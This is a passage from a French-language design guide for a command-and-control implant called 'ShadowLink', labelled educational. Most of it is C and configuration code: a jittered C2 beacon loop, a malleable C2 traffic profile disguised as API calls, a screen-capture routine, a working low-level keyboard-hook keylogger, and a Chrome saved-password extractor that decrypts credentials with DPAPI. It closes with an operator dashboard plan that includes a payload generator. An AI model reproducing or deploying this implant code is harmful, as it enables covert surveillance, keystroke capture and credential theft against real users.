    DWORD jitter_range = (BEACON_INTERVAL * JITTER_PERCENT) / 100;
    DWORD random_offset = rand() % (2 * jitter_range);
    return BEACON_INTERVAL - jitter_range + random_offset;
}

// Usage dans la boucle principale
while (1) {
    beacon_to_c2();
    Sleep(get_jittered_sleep());
}
```

### 6.2 Malleable C2 Profiles

```yaml
# Exemple de profil Cobalt Strike style
http-get:
  uri: "/api/v2/updates"
  client:
    header: "Accept: application/json"
    header: "X-Requested-With: XMLHttpRequest"
    metadata:
      base64url
      prepend: "session="
      header: "Cookie"
  server:
    header: "Content-Type: application/json"
    output:
      base64
      prepend: '{"data":"'
      append: '"}'

http-post:
  uri: "/api/v2/telemetry"
  client:
    header: "Content-Type: application/json"
    id:
      base64url
      prepend: '{"id":"'
      append: '",'
    output:
      base64
      prepend: '"data":"'
      append: '"}'
```

---

## 🎯 Phase 7 : Actions on Objectives

### 7.1 Screenshot

```c
int take_screenshot(char *output_path) {
    // Obtenir le DC de l'écran
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    // Dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // Créer un bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    
    // Copier l'écran
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Sauvegarder (BMP simple)
    BITMAPFILEHEADER bfh = {0};
    BITMAPINFOHEADER bih = {0};
    
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = -height;  // Top-down
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    
    // Écrire dans fichier...
    
    // Cleanup
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return 0;
}
```

### 7.2 Keylogger

```c
HHOOK g_hKeyboardHook;
FILE *g_logFile;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT*)lParam;
        
        // Obtenir le nom de la fenêtre active
        HWND hwnd = GetForegroundWindow();
        char title[256];
        GetWindowTextA(hwnd, title, sizeof(title));
        
        // Convertir en caractère
        BYTE keyState[256];
        GetKeyboardState(keyState);
        
        WCHAR buffer[5];
        int result = ToUnicode(p->vkCode, p->scanCode, keyState,
            buffer, 4, 0);
        
        if (result > 0) {
            fprintf(g_logFile, "[%s] %ls\n", title, buffer);
            fflush(g_logFile);
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

void start_keylogger(const char *logPath) {
    g_logFile = fopen(logPath, "a");
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
        LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
```

### 7.3 Browser Credential Extraction

```c
// Chrome credentials sont dans SQLite + chiffrés avec DPAPI
void extract_chrome_passwords() {
    // 1. Chemin du fichier Login Data
    char path[MAX_PATH];
    ExpandEnvironmentStringsA(
        "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
        path, MAX_PATH);
    
    // 2. Copier le fichier (Chrome le verrouille)
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    strcat(temp_path, "login_data_copy");
    CopyFileA(path, temp_path, FALSE);
    
    // 3. Ouvrir avec SQLite
    sqlite3 *db;
    sqlite3_open(temp_path, &db);
    
    // 4. Query les credentials
    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
    sqlite3_stmt *stmt;
    sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char *url = (const char*)sqlite3_column_text(stmt, 0);
        const char *user = (const char*)sqlite3_column_text(stmt, 1);
        const void *enc_pass = sqlite3_column_blob(stmt, 2);
        int pass_len = sqlite3_column_bytes(stmt, 2);
        
        // 5. Déchiffrer avec DPAPI
        DATA_BLOB in = {pass_len, (BYTE*)enc_pass};
        DATA_BLOB out;
        
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            printf("URL: %s, User: %s, Pass: %s\n", url, user, out.pbData);
            LocalFree(out.pbData);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_path);
}
```

---

## 🏗️ Infrastructure

### Web Interface

**Stack recommandée :**
```
Backend:  Python (FastAPI) ou Go
Frontend: React ou Vue.js
Database: PostgreSQL ou SQLite
Realtime: WebSocket

Fonctionnalités:
├── Dashboard temps réel (agents connectés)
├── Console interactive par agent
├── Historique des commandes
├── Graphe réseau (visualisation)
├── Générateur de payloads
├── Gestion multi-listeners
└── Logs d'audit
```

---

## 📚 Ressources

- [Red Team Notes](https://www.ired.team/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- [Maldev Academy](https://maldevacademy.com/)
- [Sektor7 Courses](https://institute.sektor7.net/)
- [Offensive Security](https://www.offensive-security.com/)

---

*Document créé pour ShadowLink - Projet éducatif uniquement*
